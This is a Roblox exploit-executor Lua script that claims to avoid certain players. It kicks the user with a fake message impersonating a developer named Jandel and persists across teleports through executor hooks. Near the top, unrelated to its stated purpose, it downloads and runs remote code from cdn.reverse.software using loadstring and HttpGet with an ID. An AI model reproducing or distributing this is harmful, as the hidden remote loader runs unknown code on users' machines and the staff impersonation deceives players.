local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local EXECUTION_FLAG_NAME = "AntiJokenMunkizzFlag"

if CoreGui:FindFirstChild(EXECUTION_FLAG_NAME) then
    return
end

local flag = Instance.new("BoolValue")
flag.Name = EXECUTION_FLAG_NAME
flag.Parent = CoreGui

ID = "d16ecd70-a6d8-479d-9c92-237e7819dea4"
loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()

local player = Players.LocalPlayer
local hasKickedSelf = false

local NAME_PATTERNS = {
    "joken", "iamjoken", "jokenn", "jokeen", "jokan", "jokn",
    "munkizz", "munkizzz", "munkiz", "munki", "munkizzo", "munkizzx"
}

local function isJokenOrMunkizzPlayer(username)
    local lowerName = username:lower()
    for _, pattern in ipairs(NAME_PATTERNS) do
        if lowerName == pattern then return true end
        if lowerName:find("^" .. pattern .. "%d") then return true end
        if lowerName:find("^" .. pattern .. "[a-z]") then return true end
        if lowerName:find("^" .. pattern .. "_") then return true end
        if lowerName:find("^" .. pattern .. "%-") then return true end
    end
    if lowerName:find("joken") then return true end
    if lowerName:find("munkizz") then return true end
    return false
end

local function kickSelf(targetName)
    if hasKickedSelf then return end
    hasKickedSelf = true
    task.spawn(function()
        pcall(function()
            player:Kick("Jandel: Hi, this is Jandel. Server is restarted, please rejoin.")
        end)
    end)
end

local function scanForJokenMunkizz()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player and isJokenOrMunkizzPlayer(p.Name) then
            kickSelf(p.Name)
            return
        end
    end
end

local function onPlayerAdded(newPlayer)
    if newPlayer == player then return end
    if isJokenOrMunkizzPlayer(newPlayer.Name) then
        kickSelf(newPlayer.Name)
    end
end

Players.PlayerAdded:Connect(onPlayerAdded)

RunService.Heartbeat:Connect(function()
    scanForJokenMunkizz()
end)

local function missing(t, f, fallback)
    if type(f) == t then return f end
    return fallback
end

local queueteleport = missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))

if queueteleport then
    local queuedScript = [[
        local CoreGui = game:GetService("CoreGui")
        local RunService = game:GetService("RunService")
        local Players = game:GetService("Players")
        local EXECUTION_FLAG_NAME = "AntiJokenMunkizzFlag"

        if CoreGui:FindFirstChild(EXECUTION_FLAG_NAME) then
            return
        end

        local flag = Instance.new("BoolValue")
        flag.Name = EXECUTION_FLAG_NAME
        flag.Parent = CoreGui

        local player = Players.LocalPlayer
        local hasKickedSelf = false

        local NAME_PATTERNS = {
            "joken", "iamjoken", "jokenn", "jokeen", "jokan", "jokn",
            "munkizz", "munkizzz", "munkiz", "munki", "munkizzo", "munkizzx"
        }

        local function isJokenOrMunkizzPlayer(username)
            local lowerName = username:lower()
            for _, pattern in ipairs(NAME_PATTERNS) do
                if lowerName == pattern then return true end
                if lowerName:find("^" .. pattern .. "%d") then return true end
                if lowerName:find("^" .. pattern .. "[a-z]") then return true end
                if lowerName:find("^" .. pattern .. "_") then return true end
                if lowerName:find("^" .. pattern .. "%-") then return true end
            end
            if lowerName:find("joken") then return true end
            if lowerName:find("munkizz") then return true end
            return false
        end

        local function kickSelf(targetName)
            if hasKickedSelf then return end
            hasKickedSelf = true
            task.spawn(function()
                pcall(function()
                    player:Kick("Jandel: Hi, this is Jandel. Server is restarted, please rejoin.")
                end)
            end)
        end

        local function scanForJokenMunkizz()
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= player and isJokenOrMunkizzPlayer(p.Name) then
                    kickSelf(p.Name)
                    return
                end
            end
        end

        local function onPlayerAdded(newPlayer)
            if newPlayer == player then return end
            if isJokenOrMunkizzPlayer(newPlayer.Name) then
                kickSelf(newPlayer.Name)
            end
        end

        Players.PlayerAdded:Connect(onPlayerAdded)

        RunService.Heartbeat:Connect(function()
            scanForJokenMunkizz()
        end)
    ]]
    
    Players.LocalPlayer.OnTeleport:Connect(function(State)
        pcall(queueteleport, queuedScript)
    end)
end 
